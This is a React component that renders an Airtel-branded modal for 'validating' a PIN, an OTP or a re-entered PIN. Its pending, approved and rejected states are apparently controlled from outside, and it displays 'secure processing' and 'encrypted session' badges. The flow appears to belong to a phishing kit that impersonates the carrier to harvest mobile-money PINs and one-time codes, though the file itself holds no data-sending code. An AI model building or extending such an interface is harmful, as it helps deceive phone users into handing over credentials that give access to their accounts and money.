import React from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { ShieldCheck, Loader2, CheckCircle2, AlertTriangle } from 'lucide-react';
import { AirtelLogo } from './Logos';
import { useApp } from '../context/AppContext';

interface ValidatingModalProps {
  isOpen: boolean;
  type: 'pin' | 'otp' | 'reenter';
  phone?: string;
  planName?: string;
  planPrice?: string;
  status: 'pending' | 'approved' | 'rejected' | 'idle';
}

export const ValidatingModal: React.FC<ValidatingModalProps> = ({
  isOpen,
  type,
  phone,
  planName,
  status,
}) => {
  const { t } = useApp();
  if (!isOpen) return null;

  const getPendingTitle = () => {
    if (type === 'reenter') return t('validatingReenterPin');
    if (type === 'pin') return t('validatingPin');
    return t('validatingOtp');
  };

  const getPendingMsg = () => {
    if (type === 'reenter') return t('verifyingReenterPinMsg');
    if (type === 'pin') return t('verifyingPinMsg');
    return t('verifyingOtpMsg');
  };

  const getApprovedTitle = () => {
    if (type === 'reenter') return t('reenterPinApproved');
    if (type === 'pin') return t('pinApproved');
    return t('otpApproved');
  };

  const getApprovedSubtitle = () => {
    if (type === 'pin') return t('redirecting');
    return t('activatingPlan');
  };

  const getRejectedTitle = () => {
    if (type === 'reenter') return t('reenterPinRejected');
    if (type === 'pin') return t('pinRejected');
    return t('otpRejected');
  };

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-md">
        <motion.div
          initial={{ opacity: 0, scale: 0.94, y: 12 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 8 }}
          transition={{ duration: 0.25, ease: 'easeOut' }}
          className="w-full max-w-sm bg-white rounded-3xl shadow-2xl overflow-hidden border border-neutral-200/80 text-center p-6 sm:p-8 relative"
        >
          {/* Top Brand Accent Bar */}
          <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#E60000] via-rose-500 to-[#c40000]" />

          {/* Airtel Logo Header */}
          <div className="flex justify-center mb-4 mt-1">
            <AirtelLogo variant="nextgen" className="h-9" />
          </div>

          {/* Main Status Display */}
          {status === 'pending' && (
            <div className="flex flex-col items-center py-3">
              <div className="relative flex items-center justify-center mb-5">
                <div className="w-16 h-16 rounded-full bg-red-100/80 animate-ping absolute opacity-60" />
                <div className="w-16 h-16 rounded-full bg-gradient-to-tr from-[#E60000] to-rose-500 text-white flex items-center justify-center shadow-lg shadow-red-500/25 relative z-10">
                  <Loader2 className="w-8 h-8 animate-spin" />
                </div>
              </div>

              <h3 className="font-extrabold text-neutral-900 text-lg sm:text-xl tracking-tight mb-1.5">
                {getPendingTitle()}
              </h3>

              <p className="text-xs text-neutral-500 max-w-[260px] leading-relaxed">
                {getPendingMsg()}
              </p>

              {phone && (
                <div className="mt-2.5 px-3 py-1 rounded-full bg-neutral-100 text-neutral-700 text-xs font-mono font-bold">
                  {phone}
                </div>
              )}

              {/* Secure status indicator */}
              <div className="mt-4 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-neutral-100 border border-neutral-200 text-[11px] font-semibold text-neutral-600">
                <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
                <span>{t('secureProcessing')}</span>
              </div>
            </div>
          )}

          {status === 'approved' && (
            <div className="flex flex-col items-center py-3">
              <div className="w-16 h-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center mb-4 shadow-sm">
                <CheckCircle2 className="w-9 h-9 animate-bounce" />
              </div>
              <h3 className="font-extrabold text-emerald-800 text-lg sm:text-xl tracking-tight mb-1">
                {getApprovedTitle()}
              </h3>
              <p className="text-xs text-neutral-500">
                {getApprovedSubtitle()}
              </p>
            </div>
          )}

          {status === 'rejected' && (
            <div className="flex flex-col items-center py-3">
              <div className="w-16 h-16 rounded-full bg-rose-100 text-rose-600 flex items-center justify-center mb-4 shadow-sm">
                <AlertTriangle className="w-9 h-9" />
              </div>
              <h3 className="font-extrabold text-rose-800 text-lg sm:text-xl tracking-tight mb-1">
                {getRejectedTitle()}
              </h3>
              <p className="text-xs text-neutral-500">{t('retryPrompt')}</p>
            </div>
          )}

          {/* Footer Security Badge */}
          <div className="mt-4 pt-4 border-t border-neutral-100 flex items-center justify-center gap-1.5 text-[10px] text-neutral-400 font-semibold uppercase tracking-wider">
            <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
            <span>{t('encryptedSession')}</span>
          </div>
        </motion.div>
      </div>
    </AnimatePresence>
  );
};
